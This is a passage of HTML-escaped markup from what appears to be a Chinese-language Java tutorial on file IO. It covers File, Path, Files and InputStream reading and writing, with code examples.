&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;==========&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>其它API&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>boolean canRead()：是否可读
boolean canWrite()：是否可写
boolean canExecute()：是否可执行
long length()：文件字节大小
boolean mkdir()：创建当前File对象表示的目录
boolean mkdirs()：创建当前File对象表示的目录，并在必要时将不存在的父目录也创建出来
boolean delete()：删除当前File对象表示的目录，当前目录必须为空才能删除成功
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>可以用&lt;code>createTempFile()&lt;/code>来创建一个临时文件，以及&lt;code>deleteOnExit()&lt;/code>在JVM退出时自动删除该文件&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">File&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">createTempFile&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;tmp-&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 提供临时文件的前缀和后缀
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">deleteOnExit&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// JVM退出时自动删除
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isFile&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getAbsolutePath&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>&lt;code>Path&lt;/code>对象位于&lt;code>java.nio.file&lt;/code>包，和&lt;code>File&lt;/code>对象类似，但操作更加简单，便于操作目录的拼接、遍历等&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.nio.file.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;project&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;study&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 构造一个Path对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toAbsolutePath&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 转换为绝对路径
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">normalize&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 转换为规范路径
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">File&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toFile&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 转换为File对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Path&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;..&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">toAbsolutePath&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 可以直接遍历Path
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="filespaths">Files&amp;amp;Paths&lt;/h3>
&lt;p>是&lt;code>java.nio&lt;/code>包里面的类，封装了很多读写文件的简单方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 把一个文件的全部内容读取为一个byte[]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readAllBytes&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 把一个文件的全部内容读取为String
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 默认使用UTF-8编码读取:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">content1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 可指定编码:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">content2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ISO_8859_1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 按行读取并返回每行内容:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">lines&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readAllLines&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 写入文件
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 写入二进制文件:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 写入文本并指定编码:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeString&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;文本内容...&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ISO_8859_1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 按行写入文本:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">lines&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Files&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/path/to/file.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">lines&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意，&lt;code>Files&lt;/code>提供的读写方法，受内存限制，只能读写小文件，例如配置文件等，不可一次读入几个G的大文件。读写大型文件仍然要使用文件流，每次只读写一部分文件内容&lt;/p>
&lt;h3 id="字节流读写">字节流读写&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>InputStream&lt;/code>代表输入字节流，&lt;code>OuputStream&lt;/code>代表输出字节流，以byte为最小单位&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>Reader&lt;/code>和&lt;code>Writer&lt;/code>表示字符流(读写字符，并且字符不全是单字节表示的ASCII字符)，以char为最小单位&lt;/p>
&lt;/li>
&lt;li>
&lt;p>如果数据源不是文本，就只能使用&lt;code>InputStream&lt;/code>，如果数据源是文本，使用Reader更方便一些&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;code>InputStream&lt;/code>并不是一个接口，而是一个抽象类，它是所有输入流的超类，这个抽象类定义的一个最重要的方法就是&lt;code>int read()&lt;/code>&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">abstract&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个方法会读取输入流的下一个字节，并返回字节表示的&lt;code>int&lt;/code>值（0~255），如果已读到末尾，返回&lt;code>-1&lt;/code>表示不能继续读取了&lt;/p>
&lt;ul>
&lt;li>&lt;code>FileInputStream&lt;/code>是&lt;code>InputStream&lt;/code>的一个子类，从文件流中读取数据&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.md&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(;;){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>所有与IO操作相关的代码都必须正确处理&lt;code>IOException&lt;/code>，可以用&lt;code>try ... finally&lt;/code>来保证&lt;code>InputStream&lt;/code>在无论是否发生IO错误的时候都能够正确地关闭&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readFile&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FileInputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;src/readme.txt&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#f92672">())!=-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">prinln&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">finally&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">!=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
